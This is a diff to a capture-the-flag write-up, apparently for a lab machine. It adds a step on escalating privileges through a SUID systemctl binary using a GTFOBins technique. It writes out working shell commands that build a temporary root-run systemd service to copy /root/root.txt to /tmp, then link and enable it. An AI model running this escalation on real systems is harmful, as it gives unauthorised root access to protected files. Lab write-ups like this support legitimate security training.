@@ -261,6 +261,51 @@ This binary can be abused to escalate privileges.
 We identified `systemctl` as a potential path to gain **root access**.  
 
 
+## 🛠 Step 11: Privilege Escalation (systemctl SUID via GTFOBins)
+
+Now that we have the user flag, the goal is to escalate to **root**.  
+I searched for SUID binaries and found `/bin/systemctl`. Using GTFOBins, `systemctl` can be abused to run a systemd service with root privileges.
+
+### 1️⃣ Create a temporary service file
+The following creates a temporary service file (`$TF`) that will run as root and write the contents of `/root/root.txt` to `/tmp/output`:
+
+```bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+```
+2️⃣ Link & enable the service
+
+Execute the service with systemctl:
+```bash
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+```
+
+
+📷 Screenshot:
+
+
+3️⃣ Retrieve the root flag
+
+Once the service is executed, check the /tmp/output file for the root flag:
+
+```bash
+cat /tmp/output
+```
+
+
+📷 Screenshot:
+
+
+✅ Result
+
+The modified systemctl payload successfully escalated privileges to root and captured the root flag.
+
+
 
 
 
